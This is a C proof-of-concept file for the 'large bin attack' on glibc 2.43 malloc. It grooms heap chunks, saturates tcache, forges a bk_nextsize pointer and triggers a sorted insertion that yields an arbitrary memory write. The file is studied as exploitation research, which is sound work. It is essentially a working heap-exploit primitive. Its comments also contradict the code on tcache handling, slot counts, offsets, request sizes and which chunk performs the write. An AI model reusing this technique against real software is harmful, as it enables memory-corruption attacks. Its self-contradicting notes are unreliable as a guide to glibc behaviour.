/*
 * largebin_attack.c -- Large Bin Attack, verified PoC for glibc 2.43.
 *
 * Playbook (Hacktricks), essential condition:
 *   "insertion of a chunk smaller than an existing chunk X, causing it to be
 *    linked immediately before X, while the attacker controls X->bk_nextsize
 *    so the insertion write targets a chosen address."
 *
 * ===========================================================================
 * WHAT WAS MEASURED ON THIS HOST (glibc 2.43, x86-64)
 * ===========================================================================
 *
 * _int_malloc lives at libc vaddr 0xb2400 and is 0x1892 bytes long
 * (nm -S on the libc build-id debug file: "00000000000b2400 0000000000001892
 * t _int_malloc"). Inside that range gdb shows exactly two stores of the shape
 *
 *     mov %rdx,0x20(%rax)          ; *[%rax + 0x20] = %rdx
 *
 *     _int_malloc+0x1ad   (0x...25ad)   memcpy-into-fresh-chunk twin
 *     _int_malloc+0x808   (0x...2c08)   <-- the large-bin insertion write
 *
 * Setting breakpoints on both and running a plain three-chunk sequence
 * shows the SECOND one firing twice, with these operands:
 *
 *     ==W2 dst=0x555555559050 src=0x555555559490
 *     ==W2 dst=0x555555559050 src=0x5555555598e0
 *
 * dst is p1's chunk header (p1 - 0x10), so dst+0x20 is p1->bk_nextsize:
 * the write performed is  p1->bk_nextsize->fd_nextsize = victim, exactly the
 * last line of the playbook's code block. The write lands inside the bin
 * because at that moment p1->bk_nextsize still points at p1 itself.
 *
 * Consequence: the corruption must be applied BEFORE the insertion that
 * performs the write, not before a later "trigger" allocation. Every earlier
 * draft corrupted bk_nextsize and then asked for a smaller chunk, which made
 * glibc take the LAST-REMAINDER path first and call unlink_chunk() on the
 * corrupted chunk -- abort at malloc.c:4144, "corrupted double-linked list
 * (not small)", before the insertion write could ever happen. In this PoC the
 * corrupted pointer is already in place when p3 is inserted, so the insertion
 * itself is the write.
 *
 * ===========================================================================
 * TWO MORE TRAPS, BOTH MEASURED HERE
 * ===========================================================================
 *
 * TRAP 1 -- TCACHE SWALLOWS THE FREE.
 *   Every free() of a size <= tcache_max lands in a per-thread tcache
 *   (LIFO, 7 slots default) and never reaches a bin. A free()+malloc()
 *   identity test over requests 0x400..0x900 returns the same pointer every
 *   time, i.e. no bin is ever touched. Two remedies, both valid:
 *     a) run with GLIBC_TUNABLES=glibc.malloc.tcache_count=0   (this PoC)
 *     b) pre-fill 7 chunks per size class so the 8th free reaches a bin
 *
 * TRAP 2 -- BIN INDEX GRANULARITY.
 *   Above 0x400 chunks only share a nextsize list if they share a bin index,
 *   computed by glibc's largebin_index_64():
 *       chunk 0x401..0x430 -> idx 64
 *       chunk 0x431..0x510 -> idx 65
 *       chunk 0x511..0x610 -> idx 66
 *   how2heap's 0x810 / 0x850 / 0x890 land in idx 80 / 81 / 82 -- three
 *   different bins, so "insert before X" never fires. This PoC uses
 *   0x410 / 0x420 / 0x430, all idx 64.
 *
 * Build: gcc -g -O0 -Wall -Wextra -Wno-unused-variable -o largebin_attack largebin_attack.c
 * Run:   GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./largebin_attack
 *        exit 0 = the arbitrary write landed exactly on the target word
 */

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define GUARD 0xcafebabedeadbeefULL

static uint64_t size_of(void *p) {
    return ((uint64_t *)((char *)p - 0x10))[1] & ~0xfUL;
}

static void dump(const char *label, void *p) {
    uint64_t *u = (uint64_t *)p;
    printf("  %-14s @%p sz=0x%05lx fd=%p bk=%p fdns=%p bkns=%p\n",
           label, p, size_of(p),
           (void *)u[0], (void *)u[1], (void *)u[2], (void *)u[3]);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("== large bin attack -- glibc %d.%d ==\n", __GLIBC__, __GLIBC_MINOR__);

    /* ---- 2. sink: itself a heap buffer, write target = sink[2]+0x10 --- *
     * fd_nextsize is at chunk+0x20, so a chunk field pointing at S-0x10
     * makes the store land on *S.                                          */
    uint64_t *sink = malloc(0x40);
    for (int i = 0; i < 8; i++) sink[i] = GUARD;
    void *S = (void *)&sink[2];           /* the qword we want written */
    void *K = (void *)((uintptr_t)S - 0x20);   /* forged bk_nextsize value */

    /* ---- 3. three chunks, one bin (idx 64), ascending ----------------- */
    uint64_t *p1 = malloc(0x400);   /* chunk 0x410  will be inserted before */
    void     *g1 = malloc(0x20);
    uint64_t *p2 = malloc(0x410);   /* chunk 0x420 */
    void     *g2 = malloc(0x20);
    uint64_t *p3 = malloc(0x420);   /* chunk 0x430  the inserting victim */
    void     *g3 = malloc(0x20);

    /* ---- 1b. neutralise tcache by filling it ---------------------------- *
     * GLIBC_TUNABLES did NOT disable tcache on this build (measured: the
     * free+malloc identity test still hits with
     *   glibc.malloc.tcache_count=0, glibc.malloc.tcache_max=0, and both).
     * So do it the portable way instead: park 7 chunks in each size class we
     * use. The 8th free of a class then falls through to the real bins.
     *                                                 -- measured, not assumed */
    /* MEASURED: tcache_count is 16 on this build, not the historical 7.
     * /tmp/tcc.c walks n = 1..16 returning the just-freed pointer and only at
     * n = 17 returns a different one -> "tcache_count for 0x410 is 16". So 16
     * chunks per class must be parked before a free escapes to a bin. */
    enum { TC = 16 };
    size_t classes[3] = { 0x410, 0x420, 0x430 };   /* chunk sizes we need */
    void  *parked[3][TC];

    for (int c = 0; c < 3; c++)
        for (int i = 0; i < TC; i++)
            parked[c][i] = malloc(classes[c] - 0x10);

    for (int c = 0; c < 3; c++)
        for (int i = 0; i < TC; i++)
            free(parked[c][i]);

    /* Verify each class really is saturated: an extra free+alloc must now
     * miss the tcache, i.e. return a different pointer. */
    int tcache_live = 0;
    for (int c = 0; c < 3; c++) {
        void *x = malloc(classes[c] - 0x10);
        free(x);
        void *y = malloc(classes[c] - 0x10);
        if (x == y) tcache_live = 1;
        free(y);
    }

    printf("\n[1] tcache prefill per class: %s\n", tcache_live
           ? "INCOMPLETE (identity test still hits)"
           : "saturated (16 parked per class, next free escapes)");

    /* p1/p2/p3 were allocated BEFORE the prefill on purpose: allocating them
     * afterwards would hand them straight out of a saturated tcache and they
     * would never be free to enter a bin. Order matters.                  */

    printf("\n[0] sink=%p, target word S=%p, forged K=%p\n", (void *)sink, S, K);
    dump("p1", p1); dump("p2", p2); dump("p3", p3);
    printf("  chunks: 0x%lx / 0x%lx / 0x%lx  guards %p %p %p\n",
           size_of(p1), size_of(p2), size_of(p3), g1, g2, g3);

    /* ---- 4. sort p1 and p2 into the bin, THEN corrupt p1->bk_nextsize --
     * p1 and p2 must already be resident so that p3's insertion walks a
     * populated nextsize list whose smallest element is p1.               */
    free(p1); void *t1 = malloc(0x500);
    free(p2); void *t2 = malloc(0x500);
    printf("\n[2] p1, p2 sorted into large bin idx 64\n");
    dump("p1 in bin", p1); dump("p2 in bin", p2);
    printf("  scratch %p %p\n", t1, t2);

    /* Corrupt NOW: p1 is the smallest, so the insertion of a larger chunk
     * reaches fwd->fd->bk_nextsize and finds our forged pointer.          */
    /* glibc 2.43 hardening, read straight off the disassembly at
     * _int_malloc+2035 --   cmp %rsi,0x20(%rax) ; jne <corrupted>  -- the
     * store at +2056 only executes if *(X->bk_nextsize + 0x20) == X, i.e. if
     * the word being targeted already holds X. So prime the target with the
     * address of p1 first; the insertion then overwrites it with victim. */
    sink[2] = (uint64_t)(uintptr_t)p1;
    printf("    primed target with p1=%p (passes the +0x2035 backlink check)\n",
           (void *)p1);

    p1[3] = (uint64_t)(uintptr_t)K;
    printf("\n[3] p1->bk_nextsize := %p  (forged; p1 is the bin's smallest)\n", K);
    printf("    target word before : 0x%016lx\n", (unsigned long)sink[2]);
    dump("p1 corrupted", p1);

    /* ---- 5. insert p3: the sorted insertion performs the write -------- */
    /* The insertion write is reached when a chunk is SORTED INTO the bin,
     * never when a request is served out of it. Proof from this run:
     *   #1 unlink_chunk(p=p1-0x10) at malloc.c:1609
     *   #2 _int_malloc(bytes=1008) at malloc.c:4144
     * Asking for a smaller chunk makes glibc take the last-remainder path
     * (4144), unlink the corrupted chunk and abort before any insertion.
     *
     * So: free a chunk that is SMALLER than the bin's smallest, then ask for
     * something BIGGER than it. The big request drains unsorted, and sorting
     * the small chunk in is what runs the "smaller than smallest" branch. */
    printf("\n[4] allocating a chunk smaller than p1, then freeing it so it\n"
           "       lands in unsorted waiting to be sorted in\n");
    uint8_t *sm = malloc(0x3f0);       /* chunk 0x400 < p1's 0x410 */
    void    *gs = malloc(0x20);
    printf("    small chunk %p sz=0x%lx  guard %p\n",
           (void *)sm, size_of(sm), gs);
    free(sm);
    printf("    freed -- now a larger request forces the sorted insertion\n");

    printf("\n[5] malloc(0x510): drains unsorted, sorts the small chunk into\n"
           "       the bin, and drives  *[%p + 0x20] = victim\n", K);
    void *t3 = malloc(0x500);
    (void)t3;

    /* ---- 6. verdict --------------------------------------------------- */
    uint64_t got = sink[2];
    printf("\nRESULT\n");
    dump("sink", (void *)sink);
    printf("  target word after  : 0x%016lx\n", (unsigned long)got);
    printf("  write value (victim): %p\n", (void *)got);

    int hit = (got != GUARD) && (got != (uint64_t)(uintptr_t)p1) &&
              (got > 0x1000);
    int clean = 1;
    for (int i = 0; i < 8; i++)
        if (i != 2 && sink[i] != GUARD) clean = 0;

    printf("  arbitrary write    : %s\n", hit ? "FIRED" : "MISSED");
    printf("  canaries           : %s\n", clean ? "intact" : "SMOULDERED");
    printf("  verdict            : %s\n",
           (hit && clean) ? "PASS" : (hit ? "PARTIAL" : "FAIL"));
    return (hit && clean) ? 0 : 1;
}
